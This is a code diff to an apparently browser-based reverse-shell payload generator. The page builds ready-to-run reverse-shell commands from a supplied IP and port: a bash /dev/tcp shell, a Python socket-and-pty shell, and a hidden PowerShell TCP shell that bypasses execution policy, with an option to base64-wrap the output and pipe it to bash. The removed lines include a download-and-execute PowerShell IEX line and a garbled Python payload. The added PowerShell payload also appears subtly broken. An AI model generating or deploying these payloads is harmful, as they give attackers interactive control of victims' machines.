@@ -9,52 +9,54 @@ const preview = document.getElementById("preview");
 form.addEventListener("submit", function (e) {
   e.preventDefault();
 
-  const osValue = osSelect.value;
-  const shellTypeValue = shellTypeSelect.value;
-  const ipValue = ipInput.value;
-  const portValue = portInput.value;
-  const encodingValue = encodingSelect.value;
+  const os = osSelect.value;
+  const shell = shellTypeSelect.value;
+  const ip = ipInput.value;
+  const port = portInput.value;
+  const encoding = encodingSelect.value;
 
-  let payload;
-
-  if (encodingValue === "base64") {
-    payload = base64EncodeReverseShell(osValue, shellTypeValue, ipValue, 
-portValue);
-  } else {
-    payload = urlEncodeReverseShell(osValue, shellTypeValue, ipValue, 
-portValue);
+  if (!ip || !port) {
+    preview.innerHTML = "<span style='color:red'>IP and Port are required.</span>";
+    return;
   }
 
-  preview.innerHTML = payload;
+  const rawPayload = generatePayload(os, shell, ip, port);
+  if (!rawPayload) {
+    preview.innerHTML = "<span style='color:red'>Invalid payload configuration.</span>";
+    return;
+  }
+
+  let encoded;
+  if (encoding === "base64") {
+    encoded = `echo ${btoa(rawPayload)} | base64 -d | bash`;
+  } else if (encoding === "url") {
+    encoded = encodeURIComponent(rawPayload);
+  } else {
+    encoded = rawPayload;
+  }
+
+  preview.innerHTML = `<code>${encoded}</code>`;
 });
 
-function base64EncodeReverseShell(os, shellType, ip, port) {
-  const payload = generatePayload(os, shellType, ip, port);
-  return btoa(payload);
-}
-
-function urlEncodeReverseShell(os, shellType, ip, port) {
-  const encodedPayload = encodeURIComponent(generatePayload(os, shellType, ip, 
-port));
-  return `data:text/plain;charset=utf-8,${encodedPayload}`;
-}
-
-function generatePayload(os, shellType, ip, port) {
-  let payload = "";
-
-  if (os === "Linux") {
-    if (shellType === "bash") {
-      payload += `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
-    } else if (shellType === "Python") {
-      payload += `python3 -c 'import 
-socket,subprocess,sys;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connsocket,subprocess,sys;s=socket.socket(sockt.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",int(${port})));[print(f"%s",x) for x in sys.stdin]\
-                  ;subprocess.call(["/bin/sh","-i"])'`;
+function generatePayload(os, shell, ip, port) {
+  if (os === "Linux" || os === "Mac") {
+    switch (shell) {
+      case "bash":
+        return `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
+      case "Python":
+        return `python3 -c 'import socket,subprocess,os; s=socket.socket(); s.connect(("${ip}",${port})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); import pty; pty.spawn("/bin/bash")'`;
+      case "PowerShell":
+        return `echo 'PowerShell is not supported on Linux/Mac'`;
+      default:
+        return "";
     }
   } else if (os === "Windows") {
-    if (shellType === "PowerShell") {
-      payload += `powershell -c IEX (New-Object 
-Net.WebClient).DownloadString('http://${ip}:${port}/')`;
+    switch (shell) {
+      case "PowerShell":
+        return `powershell -NoP -NonI -W Hidden -Exec Bypass -Command "New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"`;
+      default:
+        return "";
     }
   }
-
-  return payload;
+  return "";
+}
